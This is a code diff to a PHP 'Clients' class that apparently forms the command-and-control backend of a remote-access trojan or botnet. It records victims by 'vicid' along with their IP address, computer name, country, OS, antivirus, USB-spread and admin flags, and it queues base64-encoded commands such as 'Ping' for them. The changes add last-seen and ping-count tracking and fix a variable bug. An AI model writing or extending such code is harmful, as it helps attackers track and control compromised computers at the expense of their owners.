@@ -6,13 +6,13 @@ using HTTP and MySQL
 class Clients extends Database{
 	
 	// Create a new client
-	public function newClient(array $clientdata){
+	public function newClient($clientdata){
 		try {
 			if ($this->isExist($clientdata['vicid'],"clients")) {
 				$this->updateClient($clientdata);
 			} else {
 			$pdo = $this->Connect();
-			$sql = "INSERT INTO clients(vicid,ipaddress,computername,country,os,insdate,antivirus,status,is_usb,is_admin) VALUES(:vicid,:ip,:cpname,:cont,:os,:insdate,:av,:stats,:usb,:admin)";
+			$sql = "INSERT INTO clients(vicid,ipaddress,computername,country,os,insdate,update_at,pings,antivirus,status,is_usb,is_admin) VALUES(:vicid,:ip,:cpname,:cont,:os,:insdate,:update_at,:pings,:av,:stats,:usb,:admin)";
 			$stmt = $pdo->prepare($sql);
 
 			$stmt->execute($clientdata);
@@ -50,6 +50,8 @@ class Clients extends Database{
 			country = :cont,
 			os = :os,
 			insdate = :insdate,
+			update_at = :update_at,
+			pings = :pings,
 			antivirus = :av,
 			status = :stats,
 			is_usb = :usb,
@@ -219,7 +221,7 @@ class Clients extends Database{
 	public function createCommand($vicID){
 		try {
 			if ($this->isExist($vicID,"commands")) {
-				$this->updateCommands("'" . $vicid . "'",base64_encode("Ping"));
+				$this->updateCommands("'" . $vicID . "'",base64_encode("Ping"));
 			} else {
 				$pdo = $this->Connect();
 				$sql = "INSERT INTO commands(vicid,command) VALUES(:vicid,:cmd)";
